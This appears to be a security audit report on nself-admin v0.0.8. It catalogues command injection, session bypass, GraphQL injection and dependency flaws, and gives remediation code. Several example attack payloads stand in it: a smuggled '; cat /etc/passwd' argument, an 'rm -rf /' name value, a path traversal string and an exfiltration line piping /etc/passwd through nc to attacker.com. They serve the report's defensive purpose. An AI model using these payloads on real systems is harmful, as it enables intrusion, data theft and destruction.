# Security Audit Report: nself-admin v0.0.8

**Audit Date:** January 24, 2026
**Version Audited:** v0.0.8
**Audit Type:** Comprehensive 3-Pass Security Review
**Audited Components:** Authentication, API Routes, OWASP Top 10

---

## Executive Summary

This document contains the consolidated findings from three independent security audits of the nself-admin codebase. The application is a web UI wrapper for the nself CLI that manages Docker container operations, database backups, deployments, and cloud infrastructure.

### Overall Risk Assessment

| Severity     | Count | Primary Categories                                                   |
| ------------ | ----- | -------------------------------------------------------------------- |
| **CRITICAL** | 10    | Command Injection (7), Auth Bypass (2), Plain Text Passwords (1)     |
| **HIGH**     | 12    | Input Validation (4), Auth Gaps (3), Injection (3), Dependencies (2) |
| **MEDIUM**   | 11    | Rate Limiting (2), CORS (1), Headers (2), Secrets (3), Other (3)     |
| **LOW**      | 8     | Logging (2), Config (3), Code Quality (3)                            |

### Key Findings

1. **Command Injection is the #1 Risk** - Multiple API routes concatenate user input directly into shell commands
2. **Session validation bypass in middleware** - Only checks cookie existence, not validity
3. **Vulnerable dependencies** - tar, lodash, js-yaml have known CVEs
4. **GraphQL arbitrary query execution** - Authenticated users can execute any query with admin privileges

---

## CRITICAL Issues (10)

### CRIT-1: Command Injection in `/api/nself/route.ts`

**File:** `src/app/api/nself/route.ts`
**Lines:** 49-61

```typescript
const fullCommand = `nself ${command} ${args.join(' ')}`
const { stdout, stderr } = await execAsync(fullCommand, { cwd: projectPath })
```

**Issue:** The `args` array from user input is joined and passed directly to `exec()`. While `command` is validated against an allowlist, `args` is NOT validated.

**Attack Vector:**

```json
POST /api/nself
{ "command": "status", "args": ["; cat /etc/passwd #"] }
```

**Remediation:** Use `execFile()` with proper argument arrays instead of `exec()` with string concatenation.

---

### CRIT-2: Command Injection in `/api/env/route.ts`

**File:** `src/app/api/env/route.ts`
**Lines:** 162-197

```typescript
command = `nself env create ${name} ${template || 'local'}${force ? ' --force' : ''}`
command = `nself env switch ${name}`
command = `nself env delete ${name}${force ? ' --force' : ''}`
```

**Issue:** `name` and `template` parameters come directly from JSON input without sanitization.

**Attack Vector:**

```json
{ "action": "create", "name": "test; rm -rf / #", "template": "local" }
```

**Remediation:** Validate `name` against strict regex (alphanumeric + hyphens only) and use `execFile()`.

---

### CRIT-3: Command Injection in MinIO Storage Routes

**File:** `src/app/api/storage/minio/route.ts`
**Lines:** 428-594

```typescript
// Line 484-485 - MOST DANGEROUS
await execAsync(
  `docker exec nself_minio sh -c "echo '${content}' > ${tempFile}"`,
)

// Line 560-561 - User credentials in command
const { stdout } = await execAsync(
  `docker exec nself_minio mc admin user add minio ${user} ${password}`,
)
```

**Issue:** Multiple functions use `exec()` with string concatenation from user input.

**Attack Vector:**

```json
{
  "action": "uploadObject",
  "content": "'; cat /etc/passwd | nc attacker.com 1234; echo '"
}
```

**Remediation:** Use `execFile()` with array arguments or Docker SDK for container operations.

---

### CRIT-4: Command Injection in Deploy Routes

**File:** `src/app/api/deploy/route.ts`
**Lines:** 63-100

```typescript
command = `nself deploy ${environment}`
command = `nself deploy rollback${environment ? ` ${environment}` : ''}`
```

**Issue:** `environment` parameter is concatenated directly into shell commands.

**Remediation:** Validate `environment` against allowlist: `['staging', 'production', 'development']`.

---

### CRIT-5: Command Injection in Cloud Server Routes

**Files:**

- `src/app/api/cloud/servers/[name]/route.ts` (Lines 25-28, 91-95)
- `src/app/api/cloud/servers/create/route.ts` (Lines 36-44)

```typescript
const command = `nself cloud server status ${name} --json`
const command = `nself cloud server destroy ${name} --yes`
let command = `nself cloud server create ${provider} --name=${name} --size=${size} --region=${region}`
```

**Remediation:** Validate all parameters against strict patterns and use `execFile()`.

---

### CRIT-6: Command Injection in K8s/Helm Routes

**Files:**

- `src/app/api/k8s/logs/route.ts` (Lines 30-39)
- `src/app/api/helm/install/route.ts` (Lines 33-52)

```typescript
// K8s logs - pod, namespace, container all from user input
const args: string[] = ['k8s', 'logs', pod]
if (namespace) args.push(`--namespace=${namespace}`)

// Helm install - values path could be path traversal
if (values) args.push(`--values=${values}`)
```

**Remediation:** Validate parameters; restrict `values` to specific directories.

---

### CRIT-7: Command Injection in Environment Routes

**File:** `src/app/api/environments/[name]/route.ts`
**Lines:** 21-27, 71-77

```typescript
const { stdout } = await execAsync(
  `${nselfPath} deploy environments ${name} --json`,
)

// Line 71-73 - Environment variable values unvalidated
Object.entries(body.env).forEach(([key, value]) => {
  args.push(`--env=${key}=${value}`)
})
```

**Remediation:** Use `execFile()` and validate all inputs.

---

### CRIT-8: Arbitrary GraphQL Query Execution

**File:** `src/app/api/graphql/hasura/route.ts`
**Lines:** 45-72, 414-442

```typescript
if (action === 'execute') {
  return await executeGraphQL(query, variables) // No validation!
}

async function executeGraphQL(query: string, variables?: unknown) {
  const response = await fetch(HASURA_ENDPOINT, {
    headers: {
      'X-Hasura-Admin-Secret': HASURA_ADMIN_SECRET, // Admin privileges
    },
    body: JSON.stringify({ query, variables }),
  })
}
```

**Issue:** Authenticated users can execute ANY GraphQL query/mutation with admin privileges.

**Remediation:** Remove or heavily restrict; implement query allowlisting.

---

### CRIT-9: Session Token Not Validated in Middleware

**File:** `src/middleware.ts`
**Lines:** 60-62

```typescript
// For now, accept any session token that exists
// Validation happens in the API routes themselves since Edge Runtime
// doesn't support Node.js modules needed for database access
```

**Issue:** Middleware only checks cookie EXISTENCE, not VALIDITY. An attacker can set any cookie value and bypass page-level protection.

**Remediation:**

- Implement session validation via internal API call from middleware
- Use signed JWT tokens that can be validated without database
- Store validation hash that can be verified cryptographically

---

### CRIT-10: Plain Text Password Storage in Development

**File:** `src/lib/env-loader.ts`
**Lines:** 89-91, 110-112

```typescript
if (isDevEnv) {
  lines.push(`ADMIN_PASSWORD=${password}`) // Plain text!
}

if (isDevEnv && adminPassword) {
  return password === adminPassword // Plain text comparison
}
```

**Issue:** Development mode stores and compares passwords in plain text, vulnerable to timing attacks.

**Remediation:** Always hash passwords, even in development.

---

## HIGH Issues (12)

### HIGH-1: GraphQL Injection in getTables Function

**File:** `src/app/api/graphql/hasura/route.ts`
**Lines:** 181-195

```typescript
const columnsQuery = `
  query GetColumns {
    information_schema_columns(
      where: {
        table_name: { _eq: "${table.table_name}" }  // Direct interpolation!
      }
    ) { ... }
  }
`
```

**Remediation:** Use GraphQL variables: `query GetColumns($tableName: String!) { ... }`.

---

### HIGH-2: Missing Input Validation in Wizard Routes

**File:** `src/app/api/wizard/update-env-var/route.ts`
**Lines:** 6-75

```typescript
const { key, value, remove = false, environment } = await req.json()
// No validation of key format or environment path
const envFileName = environment ? `.env.${environment}` : '.env.local'
```

**Issue:** `environment` could contain path traversal (e.g., `../../../etc/cron.d/backdoor`).

**Remediation:** Validate `environment` against allowlist; validate `key` format.

---

### HIGH-3: Path Traversal Risk in env/route.ts

**File:** `src/app/api/env/route.ts`
**Lines:** 162-191

User-supplied `name`, `env1`, `env2` parameters are used in shell commands without validation.

---

### HIGH-4: Missing Authentication on Multiple Routes

Routes not in `PROTECTED_API_ROUTES` that should be:

1. `/api/backup/*` - Backup/restore operations
2. `/api/deploy/*` - Deployment operations
3. `/api/environments/*` - Environment configuration
4. `/api/cloud/*` - Cloud provider operations
5. `/api/k8s/*` - Kubernetes operations
6. `/api/helm/*` - Helm operations
7. `/api/frontend/*` - Frontend deployment
8. `/api/benchmark/*` - Benchmark operations
9. `/api/logs/*` - Log streaming
10. `/api/version` (POST can trigger updates)

**Remediation:** Add these routes to `PROTECTED_API_ROUTES` in middleware.

---

### HIGH-5: Debug Endpoints Exposed

**File:** `src/app/api/debug/log/route.ts`

Debug logging endpoint is in `PUBLIC_ROUTES` with comment "dev only" but NO environment check.

**Remediation:** Add `if (process.env.NODE_ENV !== 'development') return 404` or remove from PUBLIC_ROUTES.

---

### HIGH-6: Vulnerable Dependency - tar (CVSS 8.8)

**Package:** `tar` (7.4.3 via @tailwindcss/oxide)
**CVEs:** CVE-2026-23745, CVE-2026-23950
**Issue:** Arbitrary File Overwrite and Symlink Poisoning via insufficient path sanitization

**Remediation:** Update @tailwindcss dependencies or override tar version.

---

### HIGH-7: Vulnerable Dependency - lodash (CVSS 6.5)

**Package:** `lodash` (4.17.21)
**CVE:** CVE-2025-13465
**Issue:** Prototype pollution in `_.unset` and `_.omit` functions

**Remediation:** Upgrade to 4.17.23.

---

### HIGH-8: Weak Development Mode Password Requirements

**File:** `src/lib/auth-db.ts`
**Lines:** 16, 27-30

```typescript
const MIN_PASSWORD_LENGTH_DEV = 3
```

**Issue:** Development mode allows 3-character passwords. Misconfiguration could enable this in production.

**Remediation:** Increase minimum to 8 characters even in development.

---

### HIGH-9: Development Mode Detection Spoofable

**File:** `src/lib/auth-db.ts`
**Lines:** 154-169

```typescript
const hostname = process.env.HOSTNAME || 'localhost' // Defaults to dev mode!
const isDevHostname = devPatterns.some((pattern) => pattern.test(hostname))
```

**Issue:** Development mode triggers from hostname patterns which can be spoofed via environment variable.

**Remediation:** Use only `NODE_ENV` for security decisions.

---

### HIGH-10: Rate Limiter Uses In-Memory Storage

**File:** `src/lib/rateLimiter.ts`
**Lines:** 8-9

```typescript
const rateLimitStore = new Map<string, RateLimitEntry>()
```

**Issue:** Rate limits reset on server restart and aren't shared across instances.

**Remediation:** Implement Redis-backed rate limiting for production.

---

### HIGH-11: CSRF Token Not Bound to Session

**File:** `src/lib/csrf.ts`
**Lines:** 21-27, 48-75

```typescript
export function generateCSRFToken(): string {
  const array = new Uint8Array(CSRF_TOKEN_LENGTH)
  crypto.getRandomValues(array)
  // Token is not tied to session
}
```

**Issue:** CSRF tokens are independent of sessions. An attacker who can read cookies (via XSS) could forge requests.

**Remediation:** Bind CSRF tokens to session tokens using HMAC.

---

### HIGH-12: Sensitive Data Exposure in Error Messages

**Multiple Files**

```typescript
return NextResponse.json({
  success: false,
  error: 'Deployment action failed',
  details: execError.message || 'Unknown error',
  stdout: execError.stdout || '',
  stderr: execError.stderr || '', // Exposes system paths, credentials
})
```

**Remediation:** Sanitize error messages in production; log details server-side only.

---

## MEDIUM Issues (11)

### MED-1: In-Memory Session Storage

**File:** `src/lib/sessions.ts`
**Lines:** 9-10

Sessions stored in memory Map - lost on restart, not shared across instances.

---

### MED-2: Insufficient Origin Validation Patterns

**File:** `src/lib/csrf.ts`
**Lines:** 8-16

Origin patterns only include localhost-style domains - ineffective in production.

---

### MED-3: Cookie Secure Flag Only in Production

**File:** `src/app/api/auth/login/route.ts`
**Lines:** 114-120

`secure: process.env.NODE_ENV === 'production'` - could leak session over HTTP in dev with HTTPS.

---

### MED-4: No Request Size Limits

API routes accepting JSON bodies don't enforce size limits - potential DoS vector.

---

### MED-5: Hardcoded Secrets with Fallbacks

**Files:**

- `src/app/api/graphql/hasura/route.ts` (Lines 5-6)
- `src/app/api/config/env/route.ts` (Lines 31-41)

```typescript
const HASURA_ADMIN_SECRET =
  process.env.HASURA_GRAPHQL_ADMIN_SECRET || 'myadminsecretkey'
```

**Remediation:** Remove fallback values; fail if secrets not configured.

---

### MED-6: Vulnerable Dependency - js-yaml (CVSS 5.3)

**Package:** `js-yaml` (4.1.0)
**CVE:** CVE-2025-64718
**Issue:** Prototype pollution via merge operator

**Remediation:** Upgrade to 4.1.1.

---

### MED-7: Vulnerable Dependency - mdast-util-to-hast

**Package:** `mdast-util-to-hast` (>=13.0.0 <13.2.1)
**CVE:** CVE-2025-66400
**Issue:** Unsanitized class attribute

**Remediation:** Upgrade to 13.2.1+.

---

### MED-8: Logout Does Not Invalidate All Sessions

**File:** `src/lib/auth-db.ts`
**Lines:** 144-146

Only deletes current session - no "logout all devices" or session invalidation on password change.

---

### MED-9: Audit Log Contains PII

**File:** `src/lib/auth-db.ts`
**Lines:** 117-118, 133

Audit logs store IP addresses and user agents (PII under GDPR).

---

### MED-10: Login Error Message Enumeration

**File:** `src/app/api/auth/login/route.ts`

Different error messages for "password not set" vs "invalid password" reveal system state.

---

### MED-11: No Account Lockout After Failed Attempts

**File:** `src/lib/rateLimiter.ts`

5 attempts per 15 minutes, then reset. No permanent lockout - allows slow brute force indefinitely.

---

## LOW Issues (8)

### LOW-1: Console Logging in Production

Multiple files use `console.log()` which may expose sensitive info in production logs.

---

### LOW-2: Missing HTTP Security Headers

Current headers:

```typescript
response.headers.set('X-Content-Type-Options', 'nosniff')
response.headers.set('X-Frame-Options', 'DENY')
response.headers.set('X-XSS-Protection', '1; mode=block')
```

**Missing:**

- `Content-Security-Policy`
- `Strict-Transport-Security` (HSTS)
- `Referrer-Policy`
- `Permissions-Policy`

---

### LOW-3: Duplicate Authentication Logic

Password validation duplicated across:

- `src/lib/auth.ts`
- `src/lib/auth-db.ts`
- `src/lib/env-loader.ts`

Increases risk of inconsistent enforcement.

---

### LOW-4: CSRF Token Exposed in Response Body

**File:** `src/app/api/auth/csrf/route.ts`

Token returned in both response body AND cookie - redundant exposure.

---

### LOW-5: Password Complexity Regex Gaps

**File:** `src/lib/auth.ts`

Regex only allows `@$!%*?&` special characters - may reject valid strong passwords.

---

### LOW-6: Unused Code Patterns

```typescript
const _execAsync = promisify(exec) // Reserved for future use
const _MINIO_ACCESS_KEY = MINIO_ACCESS_KEY
```

---

### LOW-7: Debug Session Endpoint

**File:** `src/app/api/debug/session/route.ts`

Exposes session information (correctly checks NODE_ENV but shouldn't exist in production build).

---

### LOW-8: Loose Path Validation

**File:** `src/app/api/backup/route.ts`

Uses `normalize()` which may not catch all Windows edge cases.

---

## Positive Security Findings

The codebase demonstrates security awareness in several areas:

1. **CSRF Protection** - Constant-time comparison implemented (`src/lib/csrf.ts`)
2. **Input Validation** - Zod schemas for request validation (`src/lib/validation.ts`)
3. **Password Hashing** - bcryptjs with 12 salt rounds (`src/lib/auth-db.ts`)
4. **Session Security** - httpOnly cookies with SameSite=Strict
5. **Path Traversal Checks** - Environment file operations include path resolution
6. **Audit Logging** - Login attempts and operations are logged
7. **Secure Token Generation** - crypto.randomBytes for session tokens
8. **Some Routes Use execFile** - `/api/cli/execute/route.ts` correctly uses `execFile()`
9. **Command Allowlist** - nself CLI commands validated against allowlist (`src/lib/nselfCLI.ts`)

---

## Remediation Priority

### Immediate (Before Any Production Use)

1. Fix ALL command injection vulnerabilities (CRIT-1 through CRIT-7)
2. Fix session validation bypass in middleware (CRIT-9)
3. Update vulnerable dependencies (HIGH-6, HIGH-7, MED-6, MED-7)
4. Add missing routes to `PROTECTED_API_ROUTES` (HIGH-4)
5. Remove or restrict GraphQL execution endpoint (CRIT-8)

### Short-term (Next Sprint)

1. Remove plain text password storage (CRIT-10)
2. Fix GraphQL injection (HIGH-1)
3. Add environment validation in wizard routes (HIGH-2)
4. Remove debug endpoints from production (HIGH-5)
5. Increase dev password requirements (HIGH-8)

### Medium-term (Before v0.1.0)

1. Implement Redis-backed rate limiting (HIGH-10)
2. Bind CSRF tokens to sessions (HIGH-11)
3. Sanitize error messages (HIGH-12)
4. Fix development mode detection (HIGH-9)
5. Address all MEDIUM issues

### Ongoing

1. Address LOW issues
2. Implement security testing in CI/CD
3. Regular dependency updates
4. Security headers review

---

## Remediation Code Patterns

### Fixing Command Injection

**Before (Vulnerable):**

```typescript
const { stdout } = await execAsync(`nself ${command} ${args.join(' ')}`)
```

**After (Safe):**

```typescript
import { execFile } from 'child_process'
import { promisify } from 'util'

const execFileAsync = promisify(execFile)

// Validate command against allowlist
const allowedCommands = ['status', 'start', 'stop', 'build']
if (!allowedCommands.includes(command)) {
  return NextResponse.json({ error: 'Invalid command' }, { status: 400 })
}

// Validate each argument against strict pattern
const argPattern = /^[a-zA-Z0-9_-]+$/
if (!args.every((arg) => argPattern.test(arg))) {
  return NextResponse.json({ error: 'Invalid argument' }, { status: 400 })
}

// Use execFile with array arguments
const { stdout } = await execFileAsync('nself', [command, ...args], {
  cwd: projectPath,
})
```

### Fixing Session Validation

**Before (Vulnerable):**

```typescript
const sessionToken = request.cookies.get('nself-session')?.value
if (!sessionToken) {
  return NextResponse.redirect(new URL('/login', request.url))
}
// No validation of token value!
```

**After (Safe):**

```typescript
const sessionToken = request.cookies.get('nself-session')?.value
if (!sessionToken) {
  return NextResponse.redirect(new URL('/login', request.url))
}

// Call internal API to validate session
const validationResponse = await fetch(
  `${request.nextUrl.origin}/api/auth/validate`,
  {
    headers: { Cookie: `nself-session=${sessionToken}` },
  },
)
if (!validationResponse.ok) {
  return NextResponse.redirect(new URL('/login', request.url))
}
```

---

## Dependency Update Commands

```bash
# Update lodash
pnpm update lodash@^4.17.23

# Update js-yaml
pnpm update js-yaml@^4.1.1

# Check for tar updates (transitive)
pnpm update @tailwindcss/postcss @tailwindcss/oxide

# Run audit after updates
pnpm audit
```

---

## Conclusion

The nself-admin codebase has a solid foundation with proper authentication patterns, CSRF protection, and input validation frameworks. However, the extensive use of shell command execution with user input creates significant command injection risks that must be addressed before production deployment.

The 10 CRITICAL and 12 HIGH severity issues identified should be prioritized for immediate remediation. The security of this application directly impacts the infrastructure it manages, making these fixes essential.

---

**Report Generated:** January 24, 2026
**Audited By:** Security Audit Team (3-Pass Review)
**Next Audit:** Recommended before v0.1.0 release
